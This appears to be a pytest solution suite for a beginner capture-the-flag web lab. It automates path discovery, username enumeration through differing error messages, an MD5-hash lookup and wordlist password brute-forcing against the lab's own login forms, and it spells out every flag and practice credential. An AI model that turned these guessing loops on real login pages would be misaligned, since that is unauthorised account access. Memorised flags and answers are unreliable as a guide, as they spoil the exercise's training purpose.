"""Reproduce the beginner discovery and credential attacks (spoilers)."""
import base64
import hashlib
import re
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from portal import create_app  # noqa: E402


@pytest.fixture
def client():
    # These consoles need neither a seeded database nor a portal session.
    return create_app({"TESTING": True}).test_client()


def words(name):
    return (ROOT / "web-bruteforce" / "wordlists" / f"{name}.txt").read_text().splitlines()


def guess(client, path, username, password):
    return client.post(path, data={"username": username, "password": password}).get_data(as_text=True)


def crack_password(client, path, username):
    for attempt, password in enumerate(words("passwords"), 1):
        body = guess(client, path, username, password)
        if "Login successful" in body:
            assert attempt > 1
            return re.search(r"MFANO\{[^}]+\}", body).group()
        assert "MFANO{" not in body
    pytest.fail("The practice password list could not solve the challenge")


def assert_registered(stage_id, flag):
    record = next(line for line in (ROOT / "flags.sha256").read_text().splitlines() if line.startswith(stage_id + ":"))
    assert hashlib.sha256(flag.encode()).hexdigest() == record.split(":")[1]


def test_discovery_is_public_but_flags_and_management_are_not_in_robots(client):
    robots = client.get("/robots.txt")
    assert robots.status_code == 200 and robots.mimetype == "text/plain"
    assert "/management/" not in robots.get_data(as_text=True)
    navigation = client.get("/", follow_redirects=True).get_data(as_text=True)
    for area in ("archive", "office", "backup", "management"):
        assert area in words("paths")
        if area != "management":
            assert f"Disallow: /{area}/" in robots.get_data(as_text=True)
        page = client.get(f"/{area}/")
        assert page.status_code == 200
        assert f'href="/{area}/login"' in page.get_data(as_text=True)
        assert f'href="/{area}/' not in navigation
        assert b"MFANO{" not in page.data
        assert b"MFANO{" not in client.get(f"/{area}/login").data
        assert client.get(f"/{area}/dashboard").status_code == 404
    assert client.get("/not-a-real-lab-directory/").status_code == 404


def test_b64_source_and_actual_request_field_lead_to_the_archive_flag(client):
    source = client.get("/archive/login").get_data(as_text=True)
    username = base64.b64decode(re.search(r"username_b64=([A-Za-z0-9+/=]+)", source).group(1), validate=True).decode()
    assert username not in source and username not in words("usernames")
    assert 'name="Username"' in source
    assert 'transmitted.name = "username"' in client.get("/static/legacy-login.js").get_data(as_text=True)
    wrong_field = client.post("/archive/login", data={"Username": username, "password": "sunshine"})
    assert b"incorrect username or password" in wrong_field.data
    assert b"MFANO{" not in wrong_field.data
    flag = crack_password(client, "/archive/login", username)
    assert flag == "MFANO{f13ld_n4m3s_m4tt3r}"
    assert_registered("BF-01", flag)


def test_username_enumeration_then_password_guesses_reveal_the_office_flag(client):
    username = None
    for candidate in words("usernames"):
        body = guess(client, "/office/login", candidate, "deliberately-wrong-password")
        assert "MFANO{" not in body
        if "incorrect password" in body:
            username = candidate
            break
        assert "incorrect username" in body
    assert username is not None
    flag = crack_password(client, "/office/login", username)
    assert flag == "MFANO{3rr0rs_l34k_us3rs}"
    assert_registered("BF-02", flag)


def test_password_first_oracle_then_username_guesses_reveal_the_backup_flag(client):
    source = client.get("/backup/login").get_data(as_text=True)
    assert "check_order=password,username; password_scope=shared" in source
    password = None
    for candidate in words("passwords"):
        body = guess(client, "/backup/login", "deliberately-unknown-user", candidate)
        assert "MFANO{" not in body
        if "incorrect username" in body:
            password = candidate
            break
        assert "incorrect password" in body
    assert password is not None
    for candidate in words("usernames"):
        body = guess(client, "/backup/login", candidate, password)
        if "Login successful" in body:
            flag = re.search(r"MFANO\{[^}]+\}", body).group()
            assert flag == "MFANO{p4ssw0rd_ch3ck3d_f1rst}"
            assert_registered("BF-03", flag)
            break
        assert "incorrect username" in body and "MFANO{" not in body
    else:
        pytest.fail("Username guesses could not complete the password-first challenge")


def test_md5_candidates_then_password_guesses_reveal_the_management_flag(client):
    source = client.get("/management/login").get_data(as_text=True)
    digest = re.search(r"username_md5=([a-f0-9]{32})", source).group(1)
    username = next(word for word in words("usernames") if hashlib.md5(word.encode()).hexdigest() == digest)
    assert username not in source
    flag = crack_password(client, "/management/login", username)
    assert flag == "MFANO{h4sh_th3n_gu3ss}"
    assert_registered("BF-04", flag)


@pytest.mark.parametrize("path,username,password,message", [
    ("/archive/login", "unknown", "wrong", "incorrect username or password"),
    ("/archive/login", "a.njeri", "wrong", "incorrect username or password"),
    ("/archive/login", "unknown", "sunshine", "incorrect username or password"),
    ("/office/login", "unknown", "wrong", "incorrect username"),
    ("/office/login", "unknown", "welcome1", "incorrect username"),
    ("/office/login", "registrar", "wrong", "incorrect password"),
    ("/backup/login", "unknown", "wrong", "incorrect password"),
    ("/backup/login", "archivist", "wrong", "incorrect password"),
    ("/backup/login", "unknown", "football", "incorrect username"),
    ("/management/login", "unknown", "wrong", "incorrect username or password"),
    ("/management/login", "examadmin", "wrong", "incorrect username or password"),
    ("/management/login", "unknown", "dragon", "incorrect username or password"),
])
def test_each_error_proves_only_the_credential_actually_checked(client, path, username, password, message):
    response = client.post(path, data={"username": username, "password": password})
    assert response.status_code == 200
    assert re.search(r'role="alert">([^<]+)<', response.get_data(as_text=True)).group(1) == message
    assert b"MFANO{" not in response.data and b"Login successful" not in response.data


@pytest.mark.parametrize("area,username,password,stage_id", [
    ("archive", "a.njeri", "sunshine", "BF-01"), ("office", "registrar", "welcome1", "BF-02"),
    ("backup", "archivist", "football", "BF-03"), ("management", "examadmin", "dragon", "BF-04"),
])
def test_credentials_must_be_posted_and_do_not_grant_main_portal_admin(client, area, username, password, stage_id):
    path = f"/{area}/login"
    assert b"MFANO{" not in client.get(path, query_string={"username": username, "password": password}).data
    assert b"MFANO{" not in client.post(path).data
    assert b"MFANO{" not in client.post(path, json={"username": username, "password": password}).data
    success = client.post(path, data={"username": username, "password": password}).get_data(as_text=True)
    assert "MFANO{" in success and f"Login successful · {stage_id}" in success
    with client.session_transaction() as session:
        assert "role" not in session and "user_id" not in session
    assert b"MFANO{" not in client.get(path).data
    assert client.get("/admin/").status_code == 302
